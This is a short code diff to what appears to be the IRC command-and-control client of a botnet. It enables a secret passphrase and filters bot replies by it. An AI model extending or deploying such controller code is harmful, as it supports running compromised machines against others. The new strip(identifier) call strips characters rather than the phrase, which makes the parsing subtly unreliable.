@@ -16,7 +16,7 @@ class Controller_Client:
         self.nick = "rbtnik_controller" + str(self.contr_counter)
         self.irc_socket = None
         self.attack_counter = 0
-        # self.identifier = "Have you ever danced with the devil in the pale moonlight?"
+        self.identifier = "Have you ever danced with the devil in the pale moonlight?"
 
     def start_client(self):
         connected, self.irc_socket = self.__attempt_connection(5)
@@ -73,11 +73,11 @@ class Controller_Client:
         response_dict = {}
         for line in response.strip().split('\n'):
             # ignore responses that are not private messages
-            if ("PRIVMSG" in line) and (self.channel not in line):
+            if ("PRIVMSG" in line) and (self.identifier in line) and (self.channel not in line):
                 # get the sender's ID
                 sender = line.split(':')[1].split(' ')[0].split('!')[0]
                 # get the message sent by the sender
-                message = line.split(' :')[1].strip()
+                message = line.split(' :')[1].strip(self.identifier).strip()
                 response_dict[sender] = message
         if command[0] == "status":
             bot_list = []
